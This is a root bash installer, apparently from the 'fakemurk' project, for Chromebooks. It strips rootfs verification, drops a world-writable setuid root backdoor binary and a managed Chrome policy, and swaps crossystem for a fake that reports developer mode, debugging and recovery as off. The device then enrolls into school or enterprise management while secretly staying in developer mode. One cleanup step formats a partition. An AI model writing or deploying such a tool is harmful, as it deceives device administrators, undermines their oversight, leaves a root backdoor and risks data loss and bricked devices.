. /usr/share/misc/chromeos-common.sh

traps() {
    set -e
    trap 'last_command=$current_command; current_command=$BASH_COMMAND' DEBUG
    trap 'echo "\"${last_command}\" command failed with exit code $?. THIS IS A BUG, REPORT IT HERE https://github.com/MercuryWorkshop/fakemurk"' EXIT
}

swallow_stdin() {
    while read -t 0 notused; do
        read input
    done
}

fakemurk_info() {
    ascii_info
    sleep 3
    cat <<-EOF

WARNING: THIS SCRIPT WILL REQUIRE THE REMOVAL OF ROOTFS VERIFICATION, AND THE DISABLING OF AUTOUPDATES
THIS MEANS THAT IF YOU EVER TURN OFF DEVMODE, YOUR SYSTEM WILL BE BRICKED UNTIL RECOVERY

WE ARE NOT RESPONSIBLE FOR DAMAGE, YOU BEING STUPID AND MISUSING THIS, OR GETTING IN TROUBLE
DO YOU UNDERSTAND??

(enter to proceed, ctrl+c to quit)
EOF
    swallow_stdin
    read
}

csys() {
    if [ "$COMPAT" == "1" ]; then
        crossystem "$@"
    elif test -f "$ROOT/usr/bin/crossystem.old"; then
        $ROOT/usr/bin/crossystem.old "$@"
    else
        $ROOT/usr/bin/crossystem "$@"
    fi
}
cvpd() {
    if [ "$COMPAT" == "1" ]; then
        vpd "$@"
    elif test -f "$ROOT/usr/sbin/vpd.old"; then
        $ROOT/usr/sbin/vpd.old "$@"
    else
        $ROOT/usr/sbin/vpd "$@"
    fi
}

sed_escape() {
    echo -n "$1" | while read -n1 ch; do
        if [[ "$ch" == "" ]]; then
            echo -n "\n"
        fi
        echo -n \\x$(printf %x \'"$ch")
    done
}

raw_crossystem_sh() {
    base64 -d <<-EOF | bunzip2 -dc
#include "crossystem.sh.b64"
EOF
}

drop_backdoor() {
    base64 -d <<-EOF | bunzip2 -dc >$ROOT/bin/backdoor
#include "backdoor.b64"
EOF
    chown root $ROOT/bin/backdoor
    chmod u+s $ROOT/bin/backdoor
    chmod g+s $ROOT/bin/backdoor
    chmod 777 $ROOT/bin/backdoor
}
drop_pollen() {
    mkdir -p $ROOT/etc/opt/chrome/policies/managed

    base64 -d <<-EOF | bunzip2 -dc >$ROOT/etc/opt/chrome/policies/managed/policy.json
#include "pollen.json.b64"
EOF
    chmod 777 $ROOT/etc/opt/chrome/policies/managed/policy.json
}

drop_crossystem_sh() {
    vals=$(sed "s/ /THIS_IS_A_SPACE_DUMBASS/g" <<<$(crossystem_values))
    raw_crossystem_sh | sed -e "s/#__SED_REPLACEME_CROSSYSTEM_VALUES#/$(sed_escape "$vals")/g" | sed -e "s/THIS_IS_A_SPACE_DUMBASS/ /g" >$ROOT/usr/bin/crossystem
    chmod 777 $ROOT/usr/bin/crossystem
}

escape() {
    case $1 in
    '' | *[!0-9]*) printf "\"$1\"" ;;
    *) printf $1 ;;
    esac
}

crossystem_values() {
    readarray -t csys_lines <<<"$(csys)"
    for element in "${csys_lines[@]}"; do
        line_stripped=$(echo "$element" | sed -e "s/#.*//g" | sed -e 's/ .*=/=/g')
        # sed 1: cuts out all chars after the #
        # sed 2: cuts out all spaces before =
        IFS='=' read -r -a pair <<<"$line_stripped"

        key=$(echo ${pair[0]})
        # cut out all characters after an instance of 2 spaces in a row
        val="$(echo ${pair[1]} | sed -e 's/  .*//g')"
        if [ "$key" == "devsw_cur" ]; then
            val=0
        fi
        if [ "$key" == "devsw_boot" ]; then
            val=0
        fi
        if [ "$key" == "mainfw_type" ]; then
            val="normal"
        fi
        if [ "$key" == "mainfw_act" ]; then
            val="A"
        fi
        if [ "$key" == "cros_debug" ]; then
            val=0
        fi
        if [ "$key" == "dev_boot_legacy" ]; then
            val=0
        fi
        if [ "$key" == "dev_boot_signed_only" ]; then
            val=0
        fi
        if [ "$key" == "dev_boot_usb" ]; then
            val=0
        fi
        if [ "$key" == "dev_default_boot" ]; then
            val="disk"
        fi
        if [ "$key" == "dev_enable_udc" ]; then
            val=0
        fi
        if [ "$key" == "alt_os_enabled" ]; then
            val=0
        fi
        if [ "$key" == "recoverysw_boot" ]; then
            val=0
        fi
        if [ "$key" == "recoverysw_cur" ]; then
            val=0
        fi
        echo "$key=$(escape "$val")"
    done
}
move_bin() {
    if test -f "$1"; then
        mv $1 $1.old
    fi
}

disable_autoupdates() {
    # move_bin $ROOT/usr/bin/update_engine_client
    # move_bin $ROOT/usr/sbin/update_engine
    # nullify_bin $ROOT/usr/bin/update_engine_client
    # nullify_bin $ROOT/usr/sbin/update_engine
    :
}

disable_verity() {
    sleep 2
    echo "ROOTFS VERIFICATION IS ON! IT WILL NOW BE REMOVED"
    if [ "$COMPAT" == "1" ]; then
        umount $ROOT || :
        /usr/share/vboot/bin/make_dev_ssd.sh --remove_rootfs_verification -i $DST 2>/dev/null
        mount $ROOTBLK $ROOT
        sleep 2
        echo "ROOTFS VERIFICATION SUCCESSFULLY REMOVED"
    else
        /usr/share/vboot/bin/make_dev_ssd.sh --remove_rootfs_verification --partitions 2 -i $DST 2>/dev/null
        /usr/share/vboot/bin/make_dev_ssd.sh --remove_rootfs_verification --partitions 4 -i $DST 2>/dev/null
        cat <<-EOF
ROOTFS VERIFICATION SUCCESSFULLY REMOVED
IN ORDER TO PROCCEED, THE CHROMEBOOK MUST BE REBOOTED

PRESS ENTER TO REBOOT, THEN ONCE BOOTED RUN THIS SCRIPT AGAIN
EOF
        swallow_stdin
        read
        reboot
    fi
}

enable_autoenrollment() {
    cvpd -i RW_VPD -s check_enrollment=1 2>/dev/null
    cvpd -i RW_VPD -s block_devmode=0 2>/dev/null
    csys block_devmode=0 2 &>/dev/null
}

cleanup() {
    if [ "$COMPAT" == "1" ]; then
        echo "pressure washing... say yes to the overwrite prompt"
        yes | mkfs.ext4 ${DST}p1 >/dev/null 2>&1 || : # hope you didn't have anything valuable on there
    else
        rm -f /mnt/stateful_partition/.developer_mode
        # this prevents an annoying bootloop
        echo "keepimg" >/mnt/stateful_partition/factory_install_reset
    fi
}

fakemurk() {
    touch $ROOT/sbin/init 2>/dev/null || disable_verity
    echo "disabling autoupdates"
    disable_autoupdates
    sleep 2
    echo "dropping crossystem.sh"
    mv $ROOT/usr/bin/crossystem $ROOT/usr/bin/crossystem.old
    drop_crossystem_sh
    sleep 2
    echo "dropping backdoor binary"
    drop_backdoor
    sleep 2
    echo "dropping pollen"
    drop_pollen
}
main() {
    traps
    fakemurk_info

    DST=$(get_fixed_dst_drive)
    if [ -z $DST ]; then
        DST=/dev/mmcblk0
    fi

    if csys mainfw_type?recovery; then
        echo "Entering shim compatability mode"
        COMPAT=1
        stty sane
        # stops the weird input stuff

        sleep 3
        mkdir /mnta >/dev/null 2>&1 || :
        mkdir /mntb >/dev/null 2>&1 || :

        ROOT=/mnta
        ROOTBLK=${DST}p3
        mount ${DST}p3 /mnta >/dev/null 2>&1 || disable_verity
        fakemurk
        echo "murking alternative root"
        sleep 3
        ROOT=/mntb
        ROOTBLK=${DST}p5
        mount ${DST}p5 /mntb >/dev/null 2>&1 || disable_verity
        fakemurk
        sync

        umount /mnta
        umount /mntb
    else
        fakemurk
    fi

    echo "cleaning up"
    cleanup
    enable_autoenrollment
    echo "done! press enter to reboot, and your chromebook should enroll into management when rebooted, but stay hidden in devmode"
    swallow_stdin
    read
    sync
    reboot
    trap - EXIT
    exit

}

if [ "$0" = "$BASH_SOURCE" ]; then
    stty sane
    # if [ "$SHELL" != "/bin/bash" ]; then
    #     echo "hey! you ran this with \"sh\" (or some other shell). i would really prefer if you ran it with \"bash\" instead"
    # fi

    if [ "$EUID" -ne 0 ]; then
        echo "Please run as root"
        exit
    fi
    main
fi
